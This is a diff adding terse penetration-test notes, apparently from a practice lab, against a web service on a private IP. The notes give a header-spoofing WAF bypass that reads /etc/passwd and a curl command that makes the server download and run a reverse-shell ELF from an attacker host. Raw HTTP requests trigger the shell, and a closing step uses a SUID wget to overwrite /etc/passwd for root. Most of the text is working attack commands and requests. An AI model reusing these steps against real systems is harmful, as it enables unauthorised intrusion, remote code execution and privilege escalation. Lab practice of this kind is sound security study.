@@ -1,0 +1,73 @@
+nmapautomated fast full scan?
+
+/logs directory have WAF protection
+
+bypass:
+curl -H "X-Forwarded-For: localhost" http://192.168.140.134:13337/logs?file=/etc/passwd
+
+obtain clumpsyadmin
+
+
+create reverse shell linux executable (elf files)
+curl -X POST -H "Content-Type: application/json"  http://192.168.140.134:13337/update -d '{"user":"clumsyadmin","url":"http://192.168.49.140/shell.elf"}'
+
+
+trigger by running update
+- couldnt get it to run via browser, must use burpsuite and add the "X-Forwarded-For: localhost"
+- maybe is the WAF issue? or maybe it just needed time not sure
+- i think need to use burpsuite to trigger reverse shell!
+
+...
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+X-Forwarded-For: 127.0.0.1
+Connection: close
+
+
+GET /restart HTTP/1.1
+Host: 192.168.140.134:13337
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+X-Forwarded-For: 127.0.0.1
+Connection: close
+
+
+POST /restart HTTP/1.1
+Host: 192.168.140.134:13337
+Content-Length: 18
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
+Content-Type: text/plain;charset=UTF-8
+Accept: */*
+Origin: http://192.168.140.134:13337
+Referer: http://192.168.140.134:13337/restart
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+X-Forwarded-For: 127.0.0.1
+Connection: close
+
+{"confirm":"true"}
+
+
+
+
+priv esc:
+wget suid
+no chmod rights, so can't use binaries to privesc (or its very difficult)
+use wget to replace and hence edit etc passwd files
+you know how it is
+
+
+
+
+
+
+
+
+
+
+
+
